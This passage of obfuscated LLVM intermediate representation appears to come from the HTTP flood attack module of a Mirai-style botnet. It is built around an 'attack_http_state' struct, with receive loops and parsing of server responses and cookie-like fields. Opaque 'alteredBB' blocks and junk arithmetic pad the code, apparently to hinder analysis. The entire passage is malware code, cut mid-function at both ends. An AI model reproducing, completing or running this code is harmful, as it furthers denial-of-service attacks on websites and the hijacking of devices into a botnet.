  %4642 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %4643 = load i32, i32* %20, align 4
  %4644 = call i8* @table_retrieve_val(i32 41, i32* null)
  %4645 = call i32 @util_stristr(i8* %4642, i32 %4643, i8* %4644)
  %4646 = icmp ne i32 %4645, -1
  br label %originalBB298

originalBB302alteredBB:                           ; preds = %originalBB302, %2029
  %4647 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %4648 = load i32, i32* %49, align 4
  %4649 = sext i32 %4648 to i64
  %4650 = getelementptr inbounds i8, i8* %4647, i64 %4649
  %4651 = load i32, i32* %20, align 4
  %4652 = load i32, i32* %49, align 4
  %_303 = sub i32 0, %4651
  %gen304 = add i32 %_303, %4652
  %_305 = sub i32 0, %4651
  %gen306 = add i32 %_305, %4652
  %_307 = sub i32 0, %4651
  %gen308 = add i32 %_307, %4652
  %4653 = sub nsw i32 %4651, %4652
  %4654 = call i32 @util_memsearch(i8* %4650, i32 %4653, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %4654, i32* %50, align 4
  %4655 = load i32, i32* %50, align 4
  %4656 = icmp ne i32 %4655, -1
  br label %originalBB302

originalBB312alteredBB:                           ; preds = %originalBB312, %2062
  %4657 = load i32, i32* %50, align 4
  %_313 = sub i32 %4657, 2
  %gen314 = mul i32 %_313, 2
  %4658 = sub nsw i32 %4657, 2
  store i32 %4658, i32* %50, align 4
  br label %originalBB312

originalBB318alteredBB:                           ; preds = %originalBB318, %2098
  %4659 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %4660 = load i32, i32* %20, align 4
  %4661 = call i8* @table_retrieve_val(i32 40, i32* null)
  %4662 = call i32 @util_stristr(i8* %4659, i32 %4660, i8* %4661)
  %4663 = icmp ne i32 %4662, -1
  br label %originalBB318

originalBB322alteredBB:                           ; preds = %originalBB322, %2131
  %4664 = load i32, i32* %52, align 4
  %_323 = sub i32 %4664, 1
  %gen324 = mul i32 %_323, 1
  %_325 = sub i32 %4664, 1
  %gen326 = mul i32 %_325, 1
  %_327 = shl i32 %4664, 1
  %_328 = sub i32 0, %4664
  %gen329 = add i32 %_328, 1
  %_330 = sub i32 %4664, 1
  %gen331 = mul i32 %_330, 1
  %_332 = shl i32 %4664, 1
  %4665 = add nsw i32 %4664, 1
  store i32 %4665, i32* %52, align 4
  br label %originalBB322

originalBB336alteredBB:                           ; preds = %originalBB336, %2150
  %4666 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %4667 = load i32, i32* %52, align 4
  %4668 = sext i32 %4667 to i64
  %4669 = getelementptr inbounds i8, i8* %4666, i64 %4668
  %4670 = load i32, i32* %20, align 4
  %4671 = load i32, i32* %52, align 4
  %_337 = shl i32 %4670, %4671
  %_338 = sub i32 %4670, %4671
  %gen339 = mul i32 %_338, %4671
  %_340 = shl i32 %4670, %4671
  %_341 = sub i32 0, %4670
  %gen342 = add i32 %_341, %4671
  %4672 = sub nsw i32 %4670, %4671
  %4673 = call i32 @util_memsearch(i8* %4669, i32 %4672, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %4673, i32* %53, align 4
  %4674 = load i32, i32* %53, align 4
  %4675 = icmp ne i32 %4674, -1
  br label %originalBB336

originalBB346alteredBB:                           ; preds = %originalBB346, %2210
  %4676 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4677 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4676, i32 0, i32 15
  %4678 = load i32, i32* %4677, align 4
  %4679 = icmp slt i32 %4678, 5
  br label %originalBB346

originalBB350alteredBB:                           ; preds = %originalBB350, %2231
  br label %originalBB350

originalBB354alteredBB:                           ; preds = %originalBB354, %2268
  %4680 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %4681 = load i32, i32* %45, align 4
  %4682 = sext i32 %4681 to i64
  %4683 = getelementptr inbounds i8, i8* %4680, i64 %4682
  %4684 = load i32, i32* %55, align 4
  %4685 = sext i32 %4684 to i64
  %4686 = getelementptr inbounds i8, i8* %4683, i64 %4685
  %4687 = load i32, i32* %20, align 4
  %4688 = load i32, i32* %45, align 4
  %_355 = shl i32 %4687, %4688
  %_356 = sub i32 %4687, %4688
  %gen357 = mul i32 %_356, %4688
  %_358 = sub i32 %4687, %4688
  %gen359 = mul i32 %_358, %4688
  %_360 = sub i32 0, %4687
  %gen361 = add i32 %_360, %4688
  %_362 = sub i32 0, %4687
  %gen363 = add i32 %_362, %4688
  %_364 = sub i32 0, %4687
  %gen365 = add i32 %_364, %4688
  %_366 = sub i32 %4687, %4688
  %gen367 = mul i32 %_366, %4688
  %_368 = sub i32 0, %4687
  %gen369 = add i32 %_368, %4688
  %_370 = shl i32 %4687, %4688
  %4689 = sub nsw i32 %4687, %4688
  %4690 = load i32, i32* %55, align 4
  %_371 = shl i32 %4689, %4690
  %_372 = sub i32 0, %4689
  %gen373 = add i32 %_372, %4690
  %_374 = sub i32 0, %4689
  %gen375 = add i32 %_374, %4690
  %4691 = sub nsw i32 %4689, %4690
  %4692 = call i32 @util_memsearch(i8* %4686, i32 %4691, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %4692, i32* %56, align 4
  %4693 = load i32, i32* %56, align 4
  %4694 = icmp ne i32 %4693, -1
  br label %originalBB354

originalBB379alteredBB:                           ; preds = %originalBB379, %2300
  %4695 = load i32, i32* %45, align 4
  %4696 = load i32, i32* %55, align 4
  %_380 = shl i32 %4695, %4696
  %_381 = shl i32 %4695, %4696
  %_382 = sub i32 0, %4695
  %gen383 = add i32 %_382, %4696
  %_384 = sub i32 %4695, %4696
  %gen385 = mul i32 %_384, %4696
  %_386 = sub i32 %4695, %4696
  %gen387 = mul i32 %_386, %4696
  %_388 = shl i32 %4695, %4696
  %_389 = sub i32 0, %4695
  %gen390 = add i32 %_389, %4696
  %4697 = add nsw i32 %4695, %4696
  %4698 = sext i32 %4697 to i64
  %4699 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %4698
  store i8* %4699, i8** %57, align 8
  %4700 = load i32, i32* %56, align 4
  %4701 = icmp sge i32 %4700, 2
  br label %originalBB379

originalBB394alteredBB:                           ; preds = %originalBB394, %2327
  %4702 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %4703 = load i32, i32* %45, align 4
  %4704 = sext i32 %4703 to i64
  %4705 = getelementptr inbounds i8, i8* %4702, i64 %4704
  %4706 = load i32, i32* %55, align 4
  %4707 = sext i32 %4706 to i64
  %4708 = getelementptr inbounds i8, i8* %4705, i64 %4707
  %4709 = load i32, i32* %20, align 4
  %4710 = load i32, i32* %45, align 4
  %_395 = shl i32 %4709, %4710
  %_396 = shl i32 %4709, %4710
  %_397 = sub i32 %4709, %4710
  %gen398 = mul i32 %_397, %4710
  %_399 = sub i32 0, %4709
  %gen400 = add i32 %_399, %4710
  %4711 = sub nsw i32 %4709, %4710
  %4712 = load i32, i32* %55, align 4
  %_401 = sub i32 0, %4711
  %gen402 = add i32 %_401, %4712
  %_403 = sub i32 0, %4711
  %gen404 = add i32 %_403, %4712
  %_405 = shl i32 %4711, %4712
  %_406 = sub i32 %4711, %4712
  %gen407 = mul i32 %_406, %4712
  %_408 = shl i32 %4711, %4712
  %_409 = sub i32 0, %4711
  %gen410 = add i32 %_409, %4712
  %4713 = sub nsw i32 %4711, %4712
  %4714 = call i32 @util_memsearch(i8* %4708, i32 %4713, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %4715 = icmp sgt i32 %4714, 0
  br label %originalBB394

originalBB414alteredBB:                           ; preds = %originalBB414, %2381
  %4716 = load i32, i32* %18, align 4
  %4717 = load i8*, i8** %57, align 8
  %4718 = call i32 @util_strlen(i8* %4717)
  %4719 = icmp slt i32 %4716, %4718
  br label %originalBB414

originalBB418alteredBB:                           ; preds = %originalBB418, %2402
  %4720 = load i8*, i8** %57, align 8
  %4721 = load i32, i32* %18, align 4
  %4722 = sext i32 %4721 to i64
  %4723 = getelementptr inbounds i8, i8* %4720, i64 %4722
  %4724 = load i8, i8* %4723, align 1
  %4725 = sext i8 %4724 to i32
  %4726 = icmp eq i32 %4725, 61
  br label %originalBB418

originalBB422alteredBB:                           ; preds = %originalBB422, %2427
  br label %originalBB422

originalBB426alteredBB:                           ; preds = %originalBB426, %2447
  %4727 = load i8*, i8** %57, align 8
  %4728 = load i32, i32* %18, align 4
  %4729 = sext i32 %4728 to i64
  %4730 = getelementptr inbounds i8, i8* %4727, i64 %4729
  %4731 = load i8, i8* %4730, align 1
  %4732 = sext i8 %4731 to i32
  %4733 = icmp eq i32 %4732, 61
  br label %originalBB426

originalBB430alteredBB:                           ; preds = %originalBB430, %2479
  %4734 = load i8*, i8** %57, align 8
  %4735 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4736 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4735, i32 0, i32 16
  %4737 = load i32, i32* %18, align 4
  %4738 = sext i32 %4737 to i64
  %4739 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %4736, i64 0, i64 %4738
  %4740 = getelementptr inbounds [128 x i8], [128 x i8]* %4739, i32 0, i32 0
  %4741 = load i32, i32* %58, align 4
  %4742 = call signext i8 @util_strncmp(i8* %4734, i8* %4740, i32 %4741)
  %4743 = icmp ne i8 %4742, 0
  br label %originalBB430

originalBB434alteredBB:                           ; preds = %originalBB434, %2506
  store i32 1, i32* %59, align 4
  br label %originalBB434

originalBB438alteredBB:                           ; preds = %originalBB438, %2596
  %4744 = load i32, i32* %60, align 4
  %4745 = load i32, i32* %61, align 4
  %_439 = shl i32 %4744, %4745
  %_440 = shl i32 %4744, %4745
  %_441 = sub i32 0, %4744
  %gen442 = add i32 %_441, %4745
  %_443 = shl i32 %4744, %4745
  %4746 = add nsw i32 %4744, %4745
  %4747 = sext i32 %4746 to i64
  %4748 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %4747
  store i8 0, i8* %4748, align 1
  %4749 = load i32, i32* %61, align 4
  %_444 = sub i32 %4749, 1
  %gen445 = mul i32 %_444, 1
  %_446 = sub i32 0, %4749
  %gen447 = add i32 %_446, 1
  %_448 = shl i32 %4749, 1
  %_449 = shl i32 %4749, 1
  %_450 = sub i32 %4749, 1
  %gen451 = mul i32 %_450, 1
  %_452 = sub i32 0, %4749
  %gen453 = add i32 %_452, 1
  %4750 = add nsw i32 %4749, 1
  store i32 %4750, i32* %61, align 4
  %4751 = load i8*, i8** %62, align 8
  %4752 = load i32, i32* %61, align 4
  %4753 = call i32 @util_memsearch(i8* %4751, i32 %4752, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0), i32 4)
  %4754 = icmp eq i32 %4753, 4
  br label %originalBB438

originalBB457alteredBB:                           ; preds = %originalBB457, %2659
  %4755 = load i8*, i8** %62, align 8
  %4756 = load i32, i32* %18, align 4
  %4757 = sext i32 %4756 to i64
  %4758 = getelementptr inbounds i8, i8* %4755, i64 %4757
  store i8 0, i8* %4758, align 1
  br label %originalBB457

originalBB461alteredBB:                           ; preds = %originalBB461, %2680
  %4759 = load i32, i32* %18, align 4
  %_462 = sub i32 %4759, 1
  %gen463 = mul i32 %_462, 1
  %4760 = add nsw i32 %4759, 1
  store i32 %4760, i32* %18, align 4
  br label %originalBB461

originalBB467alteredBB:                           ; preds = %originalBB467, %2699
  %4761 = load i8*, i8** %62, align 8
  %4762 = call i32 @util_strlen(i8* %4761)
  %4763 = icmp sgt i32 %4762, 0
  br label %originalBB467

originalBB471alteredBB:                           ; preds = %originalBB471, %2723
  %4764 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4765 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4764, i32 0, i32 7
  %4766 = getelementptr inbounds [129 x i8], [129 x i8]* %4765, i32 0, i32 0
  %4767 = load i8*, i8** %62, align 8
  %4768 = call i32 @util_strcpy(i8* %4766, i8* %4767)
  br label %originalBB471

originalBB475alteredBB:                           ; preds = %originalBB475, %2753
  %4769 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4770 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4769, i32 0, i32 6
  %4771 = getelementptr inbounds [257 x i8], [257 x i8]* %4770, i32 0, i32 0
  %4772 = getelementptr inbounds i8, i8* %4771, i64 1
  call void @util_zero(i8* %4772, i32 255)
  %4773 = load i8*, i8** %62, align 8
  %4774 = load i32, i32* %18, align 4
  %_476 = sub i32 0, %4774
  %gen477 = add i32 %_476, 1
  %_478 = sub i32 0, %4774
  %gen479 = add i32 %_478, 1
  %_480 = shl i32 %4774, 1
  %_481 = sub i32 0, %4774
  %gen482 = add i32 %_481, 1
  %_483 = sub i32 %4774, 1
  %gen484 = mul i32 %_483, 1
  %4775 = add nsw i32 %4774, 1
  %4776 = sext i32 %4775 to i64
  %4777 = getelementptr inbounds i8, i8* %4773, i64 %4776
  %4778 = call i32 @util_strlen(i8* %4777)
  %4779 = icmp sgt i32 %4778, 0
  br label %originalBB475

originalBB488alteredBB:                           ; preds = %originalBB488, %2781
  %4780 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4781 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4780, i32 0, i32 6
  %4782 = getelementptr inbounds [257 x i8], [257 x i8]* %4781, i32 0, i32 0
  %4783 = getelementptr inbounds i8, i8* %4782, i64 1
  %4784 = load i8*, i8** %62, align 8
  %4785 = load i32, i32* %18, align 4
  %_489 = shl i32 %4785, 1
  %_490 = sub i32 0, %4785
  %gen491 = add i32 %_490, 1
  %_492 = sub i32 0, %4785
  %gen493 = add i32 %_492, 1
  %4786 = add nsw i32 %4785, 1
  %4787 = sext i32 %4786 to i64
  %4788 = getelementptr inbounds i8, i8* %4784, i64 %4787
  %4789 = call i32 @util_strcpy(i8* %4783, i8* %4788)
  br label %originalBB488

originalBB497alteredBB:                           ; preds = %originalBB497, %2816
  %4790 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4791 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4790, i32 0, i32 6
  %4792 = getelementptr inbounds [257 x i8], [257 x i8]* %4791, i32 0, i32 0
  %4793 = getelementptr inbounds i8, i8* %4792, i64 1
  call void @util_zero(i8* %4793, i32 255)
  %4794 = load i8*, i8** %62, align 8
  %4795 = load i32, i32* %18, align 4
  %_498 = sub i32 %4795, 1
  %gen499 = mul i32 %_498, 1
  %_500 = sub i32 %4795, 1
  %gen501 = mul i32 %_500, 1
  %_502 = sub i32 0, %4795
  %gen503 = add i32 %_502, 1
  %4796 = add nsw i32 %4795, 1
  %4797 = sext i32 %4796 to i64
  %4798 = getelementptr inbounds i8, i8* %4794, i64 %4797
  %4799 = call i32 @util_strlen(i8* %4798)
  %4800 = icmp sgt i32 %4799, 0
  br label %originalBB497

originalBB507alteredBB:                           ; preds = %originalBB507, %2886
  %4801 = load i32, i32* %63, align 4
  %_508 = sub i32 0, %4801
  %gen509 = add i32 %_508, 1
  %_510 = sub i32 0, %4801
  %gen511 = add i32 %_510, 1
  %_512 = sub i32 0, %4801
  %gen513 = add i32 %_512, 1
  %_514 = sub i32 0, %4801
  %gen515 = add i32 %_514, 1
  %4802 = add nsw i32 %4801, 1
  store i32 %4802, i32* %63, align 4
  br label %originalBB507

originalBB519alteredBB:                           ; preds = %originalBB519, %2949
  %4803 = load i8*, i8** %65, align 8
  %4804 = load i32, i32* %18, align 4
  %4805 = sext i32 %4804 to i64
  %4806 = getelementptr inbounds i8, i8* %4803, i64 %4805
  %4807 = load i8, i8* %4806, align 1
  %4808 = sext i8 %4807 to i32
  %4809 = icmp sle i32 %4808, 57
  br label %originalBB519

originalBB523alteredBB:                           ; preds = %originalBB523, %2973
  br label %originalBB523

originalBB527alteredBB:                           ; preds = %originalBB527, %3002
  store i32 0, i32* %66, align 4
  %4810 = load i8*, i8** %65, align 8
  %4811 = load i32, i32* %18, align 4
  %4812 = sext i32 %4811 to i64
  %4813 = getelementptr inbounds i8, i8* %4810, i64 %4812
  store i8 0, i8* %4813, align 1
  %4814 = load i32, i32* %18, align 4
  %_528 = sub i32 %4814, 1
  %gen529 = mul i32 %_528, 1
  %_530 = sub i32 %4814, 1
  %gen531 = mul i32 %_530, 1
  %_532 = sub i32 0, %4814
  %gen533 = add i32 %_532, 1
  %_534 = sub i32 %4814, 1
  %gen535 = mul i32 %_534, 1
  %_536 = sub i32 %4814, 1
  %gen537 = mul i32 %_536, 1
  %_538 = sub i32 0, %4814
  %gen539 = add i32 %_538, 1
  %4815 = add nsw i32 %4814, 1
  store i32 %4815, i32* %18, align 4
  %4816 = load i8*, i8** %65, align 8
  %4817 = load i32, i32* %18, align 4
  %4818 = sext i32 %4817 to i64
  %4819 = getelementptr inbounds i8, i8* %4816, i64 %4818
  %4820 = load i8, i8* %4819, align 1
  %4821 = sext i8 %4820 to i32
  %4822 = icmp eq i32 %4821, 32
  br label %originalBB527

originalBB543alteredBB:                           ; preds = %originalBB543, %3047
  %4823 = load i8*, i8** %65, align 8
  %4824 = load i32, i32* %18, align 4
  %4825 = sext i32 %4824 to i64
  %4826 = getelementptr inbounds i8, i8* %4823, i64 %4825
  %4827 = load i8*, i8** %65, align 8
  %4828 = load i32, i32* %18, align 4
  %4829 = sext i32 %4828 to i64
  %4830 = getelementptr inbounds i8, i8* %4827, i64 %4829
  %4831 = call i32 @util_strlen(i8* %4830)
  %4832 = call i32 @util_stristr(i8* %4826, i32 %4831, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %4833 = load i32, i32* %18, align 4
  %_544 = sub i32 %4833, %4832
  %gen545 = mul i32 %_544, %4832
  %_546 = sub i32 %4833, %4832
  %gen547 = mul i32 %_546, %4832
  %_548 = sub i32 %4833, %4832
  %gen549 = mul i32 %_548, %4832
  %_550 = sub i32 %4833, %4832
  %gen551 = mul i32 %_550, %4832
  %_552 = sub i32 %4833, %4832
  %gen553 = mul i32 %_552, %4832
  %_554 = sub i32 %4833, %4832
  %gen555 = mul i32 %_554, %4832
  %4834 = add nsw i32 %4833, %4832
  store i32 %4834, i32* %18, align 4
  br label %originalBB543

originalBB559alteredBB:                           ; preds = %originalBB559, %3084
  %4835 = load i32, i32* %18, align 4
  %_560 = sub i32 %4835, 1
  %gen561 = mul i32 %_560, 1
  %_562 = sub i32 %4835, 1
  %gen563 = mul i32 %_562, 1
  %_564 = sub i32 0, %4835
  %gen565 = add i32 %_564, 1
  %_566 = sub i32 0, %4835
  %gen567 = add i32 %_566, 1
  %_568 = shl i32 %4835, 1
  %_569 = sub i32 %4835, 1
  %gen570 = mul i32 %_569, 1
  %_571 = shl i32 %4835, 1
  %4836 = add nsw i32 %4835, 1
  store i32 %4836, i32* %18, align 4
  %4837 = load i8*, i8** %65, align 8
  %4838 = load i32, i32* %18, align 4
  %4839 = sext i32 %4838 to i64
  %4840 = getelementptr inbounds i8, i8* %4837, i64 %4839
  %4841 = load i8*, i8** %65, align 8
  %4842 = load i32, i32* %18, align 4
  %4843 = sext i32 %4842 to i64
  %4844 = getelementptr inbounds i8, i8* %4841, i64 %4843
  %4845 = call i32 @util_strlen(i8* %4844)
  %_572 = shl i32 %4845, 1
  %_573 = sub i32 %4845, 1
  %gen574 = mul i32 %_573, 1
  %_575 = sub i32 0, %4845
  %gen576 = add i32 %_575, 1
  %_577 = shl i32 %4845, 1
  %_578 = sub i32 0, %4845
  %gen579 = add i32 %_578, 1
  %_580 = shl i32 %4845, 1
  %_581 = sub i32 %4845, 1
  %gen582 = mul i32 %_581, 1
  %4846 = sub nsw i32 %4845, 1
  %4847 = sext i32 %4846 to i64
  %4848 = getelementptr inbounds i8, i8* %4840, i64 %4847
  %4849 = load i8, i8* %4848, align 1
  %4850 = sext i8 %4849 to i32
  %4851 = icmp eq i32 %4850, 34
  br label %originalBB559

originalBB586alteredBB:                           ; preds = %originalBB586, %3141
  %4852 = load i32, i32* %35, align 4
  %4853 = load i32, i32* %66, align 4
  %_587 = shl i32 %4852, %4853
  %4854 = add i32 %4852, %4853
  %4855 = zext i32 %4854 to i64
  %4856 = call i64 @time(i64* null) #6
  %4857 = icmp sgt i64 %4855, %4856
  br label %originalBB586

originalBB591alteredBB:                           ; preds = %originalBB591, %3221
  %4858 = load i8*, i8** %65, align 8
  %4859 = call i32 @util_strlen(i8* %4858)
  %4860 = icmp sgt i32 %4859, 0
  br label %originalBB591

originalBB595alteredBB:                           ; preds = %originalBB595, %3241
  %4861 = load i8*, i8** %65, align 8
  %4862 = call i32 @util_strlen(i8* %4861)
  %4863 = icmp slt i32 %4862, 128
  br label %originalBB595

originalBB599alteredBB:                           ; preds = %originalBB599, %3261
  %4864 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4865 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4864, i32 0, i32 7
  %4866 = getelementptr inbounds [129 x i8], [129 x i8]* %4865, i32 0, i32 0
  %4867 = load i8*, i8** %65, align 8
  %4868 = call i32 @util_strcpy(i8* %4866, i8* %4867)
  br label %originalBB599

originalBB603alteredBB:                           ; preds = %originalBB603, %3314
  br label %originalBB603

originalBB607alteredBB:                           ; preds = %originalBB607, %3331
  br label %originalBB607

originalBB611alteredBB:                           ; preds = %originalBB611, %3354
  %4869 = load i8*, i8** %65, align 8
  %4870 = load i32, i32* %18, align 4
  %_612 = shl i32 %4870, 1
  %_613 = sub i32 %4870, 1
  %gen614 = mul i32 %_613, 1
  %_615 = sub i32 %4870, 1
  %gen616 = mul i32 %_615, 1
  %_617 = sub i32 0, %4870
  %gen618 = add i32 %_617, 1
  %_619 = sub i32 %4870, 1
  %gen620 = mul i32 %_619, 1
  %4871 = add nsw i32 %4870, 1
  %4872 = sext i32 %4871 to i64
  %4873 = getelementptr inbounds i8, i8* %4869, i64 %4872
  %4874 = call i32 @util_strlen(i8* %4873)
  %4875 = icmp slt i32 %4874, 256
  br label %originalBB611

originalBB624alteredBB:                           ; preds = %originalBB624, %3378
  %4876 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4877 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4876, i32 0, i32 6
  %4878 = getelementptr inbounds [257 x i8], [257 x i8]* %4877, i32 0, i32 0
  %4879 = getelementptr inbounds i8, i8* %4878, i64 1
  call void @util_zero(i8* %4879, i32 255)
  %4880 = load i8*, i8** %65, align 8
  %4881 = load i32, i32* %18, align 4
  %_625 = shl i32 %4881, 1
  %_626 = sub i32 %4881, 1
  %gen627 = mul i32 %_626, 1
  %_628 = sub i32 %4881, 1
  %gen629 = mul i32 %_628, 1
  %_630 = sub i32 %4881, 1
  %gen631 = mul i32 %_630, 1
  %_632 = shl i32 %4881, 1
  %4882 = add nsw i32 %4881, 1
  %4883 = sext i32 %4882 to i64
  %4884 = getelementptr inbounds i8, i8* %4880, i64 %4883
  %4885 = call i32 @util_strlen(i8* %4884)
  %4886 = icmp sgt i32 %4885, 0
  br label %originalBB624

originalBB636alteredBB:                           ; preds = %originalBB636, %3418
  br label %originalBB636

originalBB640alteredBB:                           ; preds = %originalBB640, %3445
  %4887 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %4888 = load i32, i32* %20, align 4
  %4889 = call i32 @util_memsearch(i8* %4887, i32 %4888, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  store i32 %4889, i32* %45, align 4
  %4890 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4891 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4890, i32 0, i32 9
  %4892 = getelementptr inbounds [9 x i8], [9 x i8]* %4891, i32 0, i32 0
  %4893 = call signext i8 @util_strcmp(i8* %4892, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0))
  %4894 = sext i8 %4893 to i32
  %4895 = icmp ne i32 %4894, 0
  br label %originalBB640

originalBB644alteredBB:                           ; preds = %originalBB644, %3478
  %4896 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4897 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4896, i32 0, i32 1
  store i8 7, i8* %4897, align 4
  br label %originalBB644

originalBB648alteredBB:                           ; preds = %originalBB648, %3497
  %4898 = load i32, i32* %20, align 4
  %4899 = load i32, i32* %45, align 4
  %4900 = icmp sgt i32 %4898, %4899
  br label %originalBB648

originalBB652alteredBB:                           ; preds = %originalBB652, %3517
  %4901 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4902 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4901, i32 0, i32 1
  store i8 10, i8* %4902, align 4
  br label %originalBB652

originalBB656alteredBB:                           ; preds = %originalBB656, %3536
  %4903 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4904 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4903, i32 0, i32 1
  store i8 1, i8* %4904, align 4
  br label %originalBB656

originalBB660alteredBB:                           ; preds = %originalBB660, %3571
  br label %originalBB660

originalBB664alteredBB:                           ; preds = %originalBB664, %3588
  %4905 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4906 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4905, i32 0, i32 1
  %4907 = load i8, i8* %4906, align 4
  %4908 = zext i8 %4907 to i32
  %4909 = icmp ne i32 %4908, 7
  br label %originalBB664

originalBB668alteredBB:                           ; preds = %originalBB668, %3611
  %4910 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4911 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4910, i32 0, i32 17
  %4912 = load i32, i32* %4911, align 4
  %4913 = icmp eq i32 %4912, 1024
  br label %originalBB668

originalBB672alteredBB:                           ; preds = %originalBB672, %3644
  %4914 = call i32* @__errno_location() #7
  store i32 0, i32* %4914, align 4
  %4915 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4916 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4915, i32 0, i32 0
  %4917 = load i32, i32* %4916, align 4
  %4918 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4919 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4918, i32 0, i32 18
  %4920 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4919, i32 0, i32 0
  %4921 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4922 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4921, i32 0, i32 17
  %4923 = load i32, i32* %4922, align 4
  %4924 = sext i32 %4923 to i64
  %4925 = getelementptr inbounds i8, i8* %4920, i64 %4924
  %4926 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4927 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4926, i32 0, i32 17
  %4928 = load i32, i32* %4927, align 4
  %_673 = sub i32 0, 1024
  %gen674 = add i32 %_673, %4928
  %_675 = shl i32 1024, %4928
  %_676 = shl i32 1024, %4928
  %_677 = sub i32 0, 1024
  %gen678 = add i32 %_677, %4928
  %4929 = sub nsw i32 1024, %4928
  %4930 = sext i32 %4929 to i64
  %4931 = call i64 @recv(i32 %4917, i8* %4925, i64 %4930, i32 16384)
  %4932 = trunc i64 %4931 to i32
  store i32 %4932, i32* %20, align 4
  %4933 = load i32, i32* %20, align 4
  %4934 = icmp eq i32 %4933, 0
  br label %originalBB672

originalBB682alteredBB:                           ; preds = %originalBB682, %3684
  %4935 = load i32, i32* %20, align 4
  %4936 = icmp eq i32 %4935, -1
  br label %originalBB682

originalBB686alteredBB:                           ; preds = %originalBB686, %3707
  %4937 = call i32* @__errno_location() #7
  %4938 = load i32, i32* %4937, align 4
  %4939 = icmp ne i32 %4938, 11
  br label %originalBB686

originalBB690alteredBB:                           ; preds = %originalBB690, %3736
  br label %originalBB690

originalBB694alteredBB:                           ; preds = %originalBB694, %3767
  %4940 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4941 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4940, i32 0, i32 14
  %4942 = load i32, i32* %4941, align 4
  %4943 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4944 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4943, i32 0, i32 17
  %4945 = load i32, i32* %4944, align 4
  %4946 = icmp sgt i32 %4942, %4945
  br label %originalBB694

originalBB698alteredBB:                           ; preds = %originalBB698, %3799
  store i32 %3800, i32* %67, align 4
  %4947 = load i32, i32* %67, align 4
  %4948 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %4949 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4948, i32 0, i32 14
  %4950 = load i32, i32* %4949, align 4
  %_699 = sub i32 %4950, %4947
  %gen700 = mul i32 %_699, %4947
  %_701 = shl i32 %4950, %4947
  %_702 = shl i32 %4950, %4947
  %_703 = sub i32 %4950, %4947
  %gen704 = mul i32 %_703, %4947
  %_705 = sub i32 %4950, %4947
  %gen706 = mul i32 %_705, %4947
  %_707 = sub i32 %4950, %4947
  %gen708 = mul i32 %_707, %4947
  %4951 = sub nsw i32 %4950, %4947
  store i32 %4951, i32* %4949, align 4
